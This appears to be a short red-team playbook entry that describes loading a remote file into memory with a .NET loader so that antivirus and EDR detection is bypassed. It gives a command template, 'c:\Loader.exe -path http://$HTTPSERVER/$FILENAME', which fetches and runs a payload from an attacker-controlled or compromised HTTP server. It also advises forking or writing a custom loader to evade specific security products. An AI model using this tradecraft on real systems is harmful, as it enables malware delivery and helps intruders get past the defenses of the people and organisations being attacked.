# Description

Loading a remote file directly into memory using a Loader can help bypass AV and EDR detection. There are multiple .NET loaders available in open source to use.



Note: The open source loaders frequently become detected by AV and EDR, if detection evasion is requirement, fork or write your own .NET loader and modify it for the AV / EDR you plan to evade.



The file on the HTTP server can be hosted anywhere accessible  by the target server, on a compromised host on the LAN or over the internet.



## Objectives

1. Use a .NET Loader to load a file from a HTTP server



# Instructions

1. .NET Load the remote file into memory







**Command** ([[.NET Load a remote executable into memory]]):

```bash
c:\Loader.exe -path http://$HTTPSERVER/$FILENAME
```
